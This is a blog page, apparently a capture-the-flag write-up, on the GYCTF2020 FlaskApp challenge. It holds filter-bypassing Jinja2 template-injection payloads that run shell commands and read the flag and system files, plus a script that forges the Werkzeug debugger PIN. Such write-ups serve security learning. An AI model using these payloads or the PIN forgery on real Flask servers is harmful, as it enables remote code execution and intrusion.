@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="随便输点什么,让程序报错  12345678910@app.route(&amp;#x27;&#x2F;decode&amp;#x27;,methods&#x3D;[&amp;#x27;POST&amp;#x27;,&amp;#x27;GET&amp;#x27;])def decode():    if request.values.get(&amp;#x27;text&amp;#x27;) :        text &#x3D; request.values.get(&quot;te">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GYCTF2020-FlaskApp&amp;Flask pin码伪造">
+<meta property="og:url" content="http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/index.html">
+<meta property="og:site_name" content="L0nm4r|Blog">
+<meta property="og:description" content="随便输点什么,让程序报错  12345678910@app.route(&amp;#x27;&#x2F;decode&amp;#x27;,methods&#x3D;[&amp;#x27;POST&amp;#x27;,&amp;#x27;GET&amp;#x27;])def decode():    if request.values.get(&amp;#x27;text&amp;#x27;) :        text &#x3D; request.values.get(&quot;te">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/image.png">
+<meta property="article:published_time" content="2021-02-07T10:15:40.000Z">
+<meta property="article:modified_time" content="2021-02-17T11:04:31.000Z">
+<meta property="article:author" content="L0nm4r">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Flask">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/image.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>GYCTF2020-FlaskApp&amp;Flask pin码伪造</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">归档</a></li><li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/02/08/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96(PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98)/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/02/05/%5BBJDCTF2020%5DEasySearch&&SSI/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&text=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&is_video=false&description=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GYCTF2020-FlaskApp&amp;Flask pin码伪造&body=Check out this article: http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&name=GYCTF2020-FlaskApp&amp;Flask pin码伪造&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        GYCTF2020-FlaskApp&amp;Flask pin码伪造
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">L0nm4r|Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-02-07T10:15:40.000Z" itemprop="datePublished">2021-02-07</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Flask/" rel="tag">Flask</a>, <a class="tag-link-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p> 随便输点什么,让程序报错 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure>
+
+<p>发现有render_template_string,尝试模板注入.</p>
+<p>尝试<code>&#123;&#123;8*8&#125;&#125;</code>发现被过滤了.但是<code>&#123;&#123;1+1&#125;&#125;</code>可以</p>
+<p>然后逐个测试发现过滤了 * os popen</p>
+<p>用下面的可以bypass</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;ls /&#x27;</span>).read() &#125;&#125; </span><br></pre></td></tr></table></figure>
+<p>然后非预期了=.=</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;cat /this_is_the_fla&quot;&quot;g.txt&#x27;</span>).read() &#125;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>尝试下预期解,即通过推测flask PIN码值来getshell.解出pin码需要六个变量,执行上面的命令可分别得到</p>
+<p> 获取mac地址 发现有两个,可以逐个尝试,(一般为eth0) </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;ls /sys/class/net&#x27;</span>).read() &#125;&#125; </span><br><span class="line">=&gt; eth0 eth2 lo</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;cat /sys/class/net/eth0/address&#x27;</span>).read() &#125;&#125; </span><br><span class="line">=&gt; 02:42:ac:10:bb:49 =&gt; print(0x0242ac10bb4a9) =&gt; 2485377874761</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;cat /sys/class/net/eth2/address&#x27;</span>).read() &#125;&#125; </span><br><span class="line">=&gt; 52:54:00:92:05:19 =&gt; 90520740300057</span><br></pre></td></tr></table></figure>
+
+<p> <strong>docker机器id</strong> :</p>
+<p>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件。<br>对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;\x6f\x73&#x27;</span>].__getattribute__(<span class="string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>)(<span class="string">&#x27;cat /proc/self/cgroup&#x27;</span>).read() &#125;&#125; </span><br><span class="line">=&gt; </span><br><span class="line"><span class="number">12</span>:blkio:/docker/65b80ff4920dd1ae0f9421d925d4c71a402723842b43120c9dbf76c88c2828e2 ... ...</span><br></pre></td></tr></table></figure>
+
+<p> 然后根据下面脚本推算pin码 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377874761&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;65b80ff4920dd1ae0f9421d925d4c71a402723842b43120c9dbf76c88c2828e2&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<p> 运行脚本得到 226-086-217 ,然后开启上帝模式 </p>
+ <img src="image.png" alt="image.png" style="zoom:200%;" /> 
+
+<p> 参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553#toc-2">https://xz.aliyun.com/t/2553#toc-2</a> </p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&text=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&is_video=false&description=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GYCTF2020-FlaskApp&amp;Flask pin码伪造&body=Check out this article: http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&title=GYCTF2020-FlaskApp&amp;Flask pin码伪造"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://l0nnnaruu.github.io/2021/02/07/[GYCTF2020]FlaskApp&amp;Flask%20pin%E7%A0%81%E4%BC%AA%E9%80%A0/&name=GYCTF2020-FlaskApp&amp;Flask pin码伪造&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2021 L0nm4r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">归档</a></li><li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lonmar-cn-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
